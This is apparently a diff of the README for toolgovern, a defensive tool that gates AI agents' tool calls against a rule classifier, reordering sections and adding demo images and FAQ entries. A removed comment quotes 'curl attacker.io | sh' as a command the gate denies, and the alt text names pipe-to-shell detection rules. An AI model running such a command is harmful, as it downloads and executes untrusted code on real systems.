@@ -30,11 +30,7 @@ see [`python/README.md`](./python/README.md) and
 [docs/getting-started.md](./docs/getting-started.md) for the Python-specific walkthrough, and
 [CHANGELOG.md](./CHANGELOG.md) for each distribution's version history.
 
-<!-- TODO: no demo GIF/video exists yet. If one gets added, capture: (1) governTool() denying
-     `curl attacker.io | sh` in a terminal with the real DENIED output shown, (2) `toolgovern-cli
-     audit --verify-chain` on the resulting trace file. Target: under 15 seconds, terminal only,
-     no narration needed -- the real output already reads as the demo. Not required: the code
-     block and real CLI output below already show real behavior, not a mockup. -->
+![toolgovern validating a policy file, then denying a governed bash call that pipes a curl download from a known paste-relay host into sh, with the fired rule IDs (TG01-pipe-to-shell, TG03-network-disabled, TG03-known-paste-relay) printed before the call ever executes](./docs/demo.gif)
 
 ### Contents
 
@@ -50,9 +46,9 @@ see [`python/README.md`](./python/README.md) and
 - [What's OSS and what isn't](#whats-oss-and-what-isnt)
 - [Security](#security)
 - [Development](#development)
-- [Contributing](#contributing)
-- [FAQ](#faq)
 - [Community](#community)
+- [FAQ](#faq)
+- [Contributing](#contributing)
 - [License](#license)
 
 ---
@@ -736,6 +732,8 @@ npx toolgovern-cli audit ./toolgovern-trace.jsonl --verify-chain
 npx toolgovern-cli init langgraph
 ```
 
+![toolgovern-cli scaffolding a LangGraph integration file with init, then auditing the trace log with --json to print a single structured object an agent can parse programmatically](./docs/usage.gif)
+
 Real output from this repo's own example policy and the trace file generated above:
 
 ```
@@ -848,18 +846,22 @@ pip install -e ".[dev]"
 pytest
 ```
 
-## Contributing
+## Community
 
-Pull requests are welcome. Every PR runs through the same four CI gates a contributor should run
-locally first: `npm run lint && npm run format`, `npm run typecheck` (strict, zero unexplained
-`@ts-ignore`), `npm run test:coverage` (80% overall, 90%+ on the classifier and scoping modules),
-and `npm audit --audit-level=high`. A PR that fails any of them will not merge. Adding or changing
-a classifier rule needs at least 3 true-positive and 3 true-negative test cases plus a `reason`
-string specific enough to explain a denial without reading the rule's source. Full detail,
-including how to change the scoping-inheritance model or the trace schema without breaking their
-guarantees, is in `CONTRIBUTING.md`. Report a vulnerability per `SECURITY.md`, not a public issue.
+No Discord or chat server yet. GitHub Issues and Discussions are the place to report a bug, a
+missed detection, or a rule that fired when it shouldn't have. If the classifier misses something
+in your own usage, open a discussion with the trace excerpt; the rule pack is meant to improve from
+real gate decisions, not just the test corpus.
 
 ## FAQ
+
+**What is toolgovern, and how is it different from a framework's own tool-call safeguards?**
+It's a runtime gate that checks every tool call an AI agent makes -- shell, filesystem, network,
+credential access -- against a 35-rule classifier before the call executes, not after. Most agent
+frameworks either run tool calls straight through or offer a manual human-in-the-loop pause; they
+don't ship an automated, disclosed rule set that catches things like a pipe-to-shell download or a
+sub-agent exceeding its coordinator's scope without you writing that logic yourself. See
+[The gap this closes](#the-gap-this-closes) and [What it does](#what-it-does) for the full case.
 
 **Does toolgovern make a tool call safe?**
 No. A gate decision of `allow` means the call was checked against the current 35-rule set and
@@ -876,14 +878,27 @@ No. Everything runs in-process, on your own machine or infrastructure. No call p
 trace content, or policy leaves the process unless code you write sends it somewhere -- there's no
 server dependency and nothing to sign up for.
 
-**Does it work with Python or .NET agent frameworks?**
-Yes, both have a genuine core port, not a bridge that shells out to the Node binary. The Python
-port is published to PyPI as `toolgovern-cli` (`pip install toolgovern-cli`, see
+**Does it work with Python or .NET agent frameworks, and how do I install it?**
+Yes, both have a genuine core port, not a bridge that shells out to the Node binary. `npm install
+toolgovern` (plus `toolgovern-cli` for the CLI) covers TypeScript/JavaScript. The Python port is
+published to PyPI as `toolgovern-cli` (`pip install toolgovern-cli`, see
 [`python/README.md`](./python/README.md)) and its five framework integrations (LangGraph, CrewAI, AutoGen, Microsoft Agent Framework, Claude
 Agent SDK) are source-only for now, install from source; the .NET port (`dotnet/ToolGovern`,
 source-available, not yet on NuGet) ships a Microsoft Agent Framework (.NET) adapter. See
 [Framework integration](#framework-integration) above for the full list and what's actually
 published versus source-only today.
+
+**How does toolgovern compare to Microsoft's Agent Governance Toolkit?**
+Fairly closely on features, honestly. Both do per-agent scope narrowing and write a tamper-evident
+audit trail; AGT's version of both is more mature (a formal delegation-chain spec, a privilege-ring
+model, 157 conformance tests just for its audit layer). The real difference is deployment shape:
+toolgovern is a library you `npm install` and wrap one function with, running 35 rules that ship
+built in with zero policy authoring; AGT is infrastructure you deploy, with a policy engine (YAML/OPA/Cedar),
+an identity system, and an execution sandbox behind it. If you want a curated rule set with nothing
+to stand up, that's toolgovern's case. If you need a full governance platform with a support
+contract behind it, AGT is the more honest answer today. See
+[How it compares](#how-it-compares-to-other-agent-governance-projects) for the full table,
+including NVIDIA NeMo Relay and LangGraph's human-in-the-loop middleware.
 
 **Does it detect every risky tool call?**
 No, and the README says so on purpose. The 35 rules are checked honestly against a 116-case corpus
@@ -900,12 +915,21 @@ code (`0`/`1`/`2`) always matching `ok`. See [Command reference](#command-refere
 No. Everything that exists today is in this repository, Apache 2.0, self-hosted only. See
 [What's OSS and what isn't](#whats-oss-and-what-isnt) for what that does and doesn't include.
 
-## Community
+**Can I use toolgovern commercially, and do I have to open-source anything I build with it?**
+Yes, and no. It's Apache 2.0 -- you can use it in a closed-source or commercial product without
+open-sourcing your own code; the license only requires preserving copyright/license notices and
+stating changes if you modify toolgovern's own source. See `LICENSE` for the full text.
 
-No Discord or chat server yet. GitHub Issues and Discussions are the place to report a bug, a
-missed detection, or a rule that fired when it shouldn't have. If the classifier misses something
-in your own usage, open a discussion with the trace excerpt; the rule pack is meant to improve from
-real gate decisions, not just the test corpus.
+## Contributing
+
+Pull requests are welcome. Every PR runs through the same four CI gates a contributor should run
+locally first: `npm run lint && npm run format`, `npm run typecheck` (strict, zero unexplained
+`@ts-ignore`), `npm run test:coverage` (80% overall, 90%+ on the classifier and scoping modules),
+and `npm audit --audit-level=high`. A PR that fails any of them will not merge. Adding or changing
+a classifier rule needs at least 3 true-positive and 3 true-negative test cases plus a `reason`
+string specific enough to explain a denial without reading the rule's source. Full detail,
+including how to change the scoping-inheritance model or the trace schema without breaking their
+guarantees, is in `CONTRIBUTING.md`. Report a vulnerability per `SECURITY.md`, not a public issue.
 
 ## License
 
